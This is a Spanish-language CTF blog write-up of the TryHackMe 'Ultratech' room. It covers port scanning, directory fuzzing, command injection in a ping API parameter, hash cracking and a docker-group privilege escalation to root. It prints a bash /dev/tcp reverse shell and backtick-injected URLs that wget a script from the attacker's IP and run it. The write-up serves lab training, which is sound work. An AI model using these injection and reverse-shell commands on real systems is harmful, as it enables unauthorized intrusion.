@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>TryHackMe - Ultratech :: sckull — HackTheBox Writeups, CTF</title>    
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Titulo Ultratech     Room Ultratech   Info The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing   Puntos 2018   Dificultad Media   Maker lp1    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.
+# Nmap 7.80 scan initiated Tue Feb 25 22:11:48 2020 as: nmap -p- -T4 -sV -o nmap_scan 10."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/ultratech/" />
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="shortcut icon" href="/img/favicon.png">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="TryHackMe - Ultratech :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Titulo Ultratech     Room Ultratech   Info The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing   Puntos 2018   Dificultad Media   Maker lp1    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.
+# Nmap 7.80 scan initiated Tue Feb 25 22:11:48 2020 as: nmap -p- -T4 -sV -o nmap_scan 10." />
+<meta name="twitter:site" content="/" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="/image/tryhackme/ultratech/cover.png">
+
+
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="TryHackMe - Ultratech :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Titulo Ultratech     Room Ultratech   Info The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing   Puntos 2018   Dificultad Media   Maker lp1    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.
+# Nmap 7.80 scan initiated Tue Feb 25 22:11:48 2020 as: nmap -p- -T4 -sV -o nmap_scan 10." />
+<meta property="og:url" content="/posts/ultratech/" />
+<meta property="og:site_name" content="TryHackMe - Ultratech" />
+<meta property="og:image" content="/image/tryhackme/ultratech/cover.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />
+
+
+<script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "/"
+        },
+        "articleSection" : "posts",
+        "name" : "TryHackMe - Ultratech",
+        "headline" : "TryHackMe - Ultratech",
+        "description" : "Titulo Ultratech     Room Ultratech   Info The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing   Puntos 2018   Dificultad Media   Maker lp1    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.
+# Nmap 7.80 scan initiated Tue Feb 25 22:11:48 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.",
+        "inLanguage" : "en-US",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2020",
+        "datePublished": "2020-02-26 00:00:00 &#43;0000 UTC",
+        "dateModified" : "2020-02-26 00:00:00 &#43;0000 UTC",
+        "url" : "/posts/ultratech/",
+        "wordCount" : "609",
+        "keywords" : [ "tryhackme","linux","Blog" ]
+    }
+    </script>
+
+
+<meta property="article:published_time" content="2020-02-26 00:00:00 &#43;0000 UTC" />
+
+
+
+
+<a name="top"></a>
+</head>
+
+<body class="dark-theme">
+  
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+      
+        
+                   
+
+          
+
+          
+
+          
+            <li><a href="/about">About</a></li>
+          
+
+        
+      
+        
+                   
+
+          
+            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+          
+
+          
+
+          
+
+        
+      
+        
+                   
+
+          
+
+          
+            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+          
+
+          
+
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        
+
+          
+
+          
+
+          
+            <li><a href="/about">About</a></li>
+          
+
+      
+    
+      
+        
+
+          
+            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+          
+
+          
+
+          
+
+      
+    
+      
+        
+
+          
+
+          
+            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+          
+
+          
+
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+
+  <div class="post">
+    <h2 class="post-title">TryHackMe - Ultratech</h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          <i class="fas fa-calendar-week"></i>
+            Wednesday, Feb 26, 2020
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+        <span class="post-read-time">— 3 min read</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">
+        
+         <a class="button-tag" href="/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
+        
+         <a class="button-tag" href="/tags/linux/"><li class="fa fa-tag"></li> linux</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/posts/ultratech/../../image/tryhackme/ultratech/cover.png" class="post-cover center" />
+      
+      <hr />
+     
+    
+
+    <div class="contenido">
+      <h2>Contenido</h2>
+      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#nmap">NMAP</a>
+<ul>
+<li><a href="#wfuzz-puerto-8081">WFUZZ - Puerto 8081</a></li>
+<li><a href="#gobuster-puerto-31331">GOBUSTER - Puerto 31331</a></li>
+</ul></li>
+<li><a href="#www-shell">WWW - Shell</a></li>
+<li><a href="#user-r00t">USER - r00t</a>
+<ul>
+<li><a href="#ftp-ssh">FTP-SSH</a></li>
+</ul></li>
+<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+</ul></li>
+</ul>
+</nav>
+    </div>
+
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Titulo</th>
+<th>Ultratech</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Room</td>
+<td>Ultratech</td>
+</tr>
+
+<tr>
+<td>Info</td>
+<td>The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>2018</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Media</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://tryhackme.com/p/lp1">lp1</a></td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="nmap">NMAP</h2>
+
+<p>Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Tue Feb 25 22:11:48 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.223.47
+Nmap scan report for 10.10.223.47
+Host is up (0.18s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+8081/tcp  open  http    Node.js Express framework
+31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Feb 25 22:36:00 2020 -- 1 IP address (1 host up) scanned in 1451.43 seconds
+</code></pre>
+
+<h3 id="wfuzz-puerto-8081">WFUZZ - Puerto 8081</h3>
+
+<p>Utilizamos WFUZZ para encontrar directorios y archivos.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/ultratech# wfuzz -w /usr/share/wordlists/dirb/common_nofirst10.txt -u http://10.10.223.47:8081/FUZZ --sc 200
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://10.10.223.47:8081/FUZZ
+Total requests: 4586
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                             
+===================================================================
+
+000000001:   200        0 L      3 W      20 Ch       &quot;&quot;                                                                                  
+000000487:   200        0 L      8 W      39 Ch       &quot;auth&quot;                                                                              
+
+Total time: 429.3228
+Processed Requests: 4586
+Filtered Requests: 4584
+Requests/sec.: 10.68193
+</code></pre>
+
+<h3 id="gobuster-puerto-31331">GOBUSTER - Puerto 31331</h3>
+
+<p>Ya que en este puerto esta corriendo el servicio de APACHE utilizamos gobuster para encontrar directorios y archivos.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/ultratech# gobuster dir -u http://10.10.223.47:31331 -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15 -x php,html,txt -q
+/css (Status: 301)
+/favicon.ico (Status: 200)
+/images (Status: 301)
+/index.html (Status: 200)
+/index.html (Status: 200)
+/javascript (Status: 301)
+/js (Status: 301)
+/partners.html (Status: 200)
+/robots.txt (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+/what.html (Status: 200)
+root@aoiri:~/tryhackme/ultratech#
+</code></pre>
+
+<h2 id="www-shell">WWW - Shell</h2>
+
+<p>Enumeramos las paginas que encontramos en el puerto 31331 y al visitar <strong>partners.html</strong> encontramos una panel de inicio de sesion.</p>
+
+<p><img src="../../image/tryhackme/ultratech/Screenshot_20200225_235726.png" alt="image" /></p>
+
+<p>Analizamos el codigo fuente y encontramos un archivo de javascript en el que nos muestra una ruta nueva con su parametro de la API que esta corriendo en el servicio de <strong>Node.js</strong> en el puerto <strong>8081</strong>.</p>
+
+<p><img src="../../image/tryhackme/ultratech/Screenshot_20200225_235906.png" alt="image" /></p>
+
+<p>En el parametro ingresamos nuestra IP, y ejecutamos tcpdump para capturar paquetes ICMP.</p>
+
+<p><img src="../../image/tryhackme/ultratech/Screenshot_20200226_000022.png" alt="image" /></p>
+
+<p>Vemos que la maquina nos hace ping. Utilizamos &ldquo;Command Injection&rdquo; para poder ejecutar comandos, utilizamos <strong>`</strong> (acento grave | codigo ascii 96) para &ldquo;escapar&rdquo; la ejecucion del comando ping. Creamos un archivo bash en el que escribimos nuestra shell inversa, en la ruta de la API ejecutamos comandos para: descargar el archivo y ejecutar el archivo.</p>
+
+<p><strong>shell.sh:</strong></p>
+
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/10.8.1.72/4242 0&gt;&amp;1
+</code></pre>
+
+<p><strong>Commandos:</strong></p>
+
+<pre><code class="language-bash">#Primer comando
+wget 10.8.1.72/shell.sh -o shell.sh
+
+#Segundo Comando
+bash shell.sh
+</code></pre>
+
+<p>Ejecutamos los comandos como parametro en la URL:</p>
+
+<pre><code>view-source:http://10.10.223.47:8081/ping?ip=`wget 10.8.1.72/shell.sh -o shell.sh`
+view-source:http://10.10.223.47:8081/ping?ip=`bash shell.sh`
+</code></pre>
+
+<p>Una vez hecho esto, logramos obtener una shell con el usuario www:
+<img src="../../image/tryhackme/ultratech/Screenshot_20200226_000553.png" alt="image" /></p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"><strong>Command Injection</strong></a></p>
+
+<h2 id="user-r00t">USER - r00t</h2>
+
+<p>Dentro de los archivos de la maquina encontramos una base de datos, la pasamos a nuestra maquina para poder ver los datos que tiene.</p>
+
+<p><img src="../../image/tryhackme/ultratech/Screenshot_20200226_000832.png" alt="image" /></p>
+
+<p>En la base de datos encontramos la tabla de &lsquo;users&rsquo; en donde encontramos dos usuarios y su contraseña encriptada:
+<img src="../../image/tryhackme/ultratech/Screenshot_20200226_000859.png" alt="image" /></p>
+
+<p>Utilizamos crackstation para crackear las hashes:</p>
+
+<p><img src="../../image/tryhackme/ultratech/Screenshot_20200226_001026.png" alt="image" /></p>
+
+<p>Vemos que los usuarios registrados en la maquina aparece r00t utilizamos la contraseña crackeada y logramos obtener una shell con este usuario.
+<img src="../../image/tryhackme/ultratech/Screenshot_20200226_001300.png" alt="image" /></p>
+
+<h3 id="ftp-ssh">FTP-SSH</h3>
+
+<p>De igual forma con las credenciales de r00t podemos ingresar al servicio de FTP y SSH.
+<img src="../../image/tryhackme/ultratech/Screenshot_20200226_001550.png" alt="image" /></p>
+
+<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+
+<p>Una pequeña enumeracion basta para poder tener la idea de lo que debemos de hacer, en este caso encontramos que el usuario r00t pertenece al grupo de docker. Utilizamos docker para obtener una shell con el usuario root.</p>
+
+<p><img src="../../image/tryhackme/ultratech/Screenshot_20200226_004109.png" alt="image" /></p>
+
+<p><a href="https://gtfobins.github.io/gtfobins/docker/"><strong>Docker GTFOBINS</strong></a></p>
+
+    </div>    
+    <hr />
+    
+    <div>
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+    </div>
+
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="/posts/knockknock/">
+                <span class="button__text">TryHackMe - KnockKnock</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    
+  </div>
+  
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span style="font-size: 0.85em;">© 2020 sckull</span>
+        
+      
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+  
+  
+  
+  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
+  
+</div>
+
+
+
+
+
+
+</body>
+</html>
